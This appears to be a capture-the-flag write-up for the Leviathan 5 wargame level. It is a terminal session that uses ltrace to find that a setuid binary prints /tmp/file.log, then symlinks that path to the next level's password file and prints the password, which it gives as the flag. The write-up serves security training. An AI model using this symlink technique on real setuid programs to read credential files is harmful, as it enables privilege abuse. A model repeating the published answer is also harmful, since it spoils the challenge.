# Leviathan 5

## LEVEL GOAL

There is no information for this level, intentionally.

## SOLUTION

```
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log

leviathan5@leviathan:~$ touch /tmp/file.log

leviathan5@leviathan:~$ ./leviathan5 

leviathan5@leviathan:~$ touch /tmp/file.log

leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xbffff784, 0x80486b0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                   = 0x804b008
fgetc(0x804b008)                                                                                                              = '\377'
feof(0x804b008)                                                                                                               = 1
fclose(0x804b008)                                                                                                             = 0
getuid()                                                                                                                      = 12005
setuid(12005)                                                                                                                 = 0
unlink("/tmp/file.log")                                                                                                       = 0
+++ exited (status 0) +++

leviathan5@leviathan:~$ echo "flag" > /tmp/file.log

leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xbffff784, 0x80486b0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                   = 0x804b008
fgetc(0x804b008)                                                                                                              = 'f'
feof(0x804b008)                                                                                                               = 0
putchar(102, 0x8048730, 0xb7e43880, 0x80485f2)                                                                                = 102
fgetc(0x804b008)                                                                                                              = 'l'
feof(0x804b008)                                                                                                               = 0
putchar(108, 0x8048730, 0xb7e43880, 0x80485f2)                                                                                = 108
fgetc(0x804b008)                                                                                                              = 'a'
feof(0x804b008)                                                                                                               = 0
putchar(97, 0x8048730, 0xb7e43880, 0x80485f2)                                                                                 = 97
fgetc(0x804b008)                                                                                                              = 'g'
feof(0x804b008)                                                                                                               = 0
putchar(103, 0x8048730, 0xb7e43880, 0x80485f2)                                                                                = 103
fgetc(0x804b008)                                                                                                              = '\n'
feof(0x804b008)                                                                                                               = 0
putchar(10, 0x8048730, 0xb7e43880, 0x80485f2flag
)                                                                                 = 10
fgetc(0x804b008)                                                                                                              = '\377'
feof(0x804b008)                                                                                                               = 1
fclose(0x804b008)                                                                                                             = 0
getuid()                                                                                                                      = 12005
setuid(12005)                                                                                                                 = 0
unlink("/tmp/file.log")                                                                                                       = 0
+++ exited (status 0) +++

leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```

## FLAG

UgaoFee4li
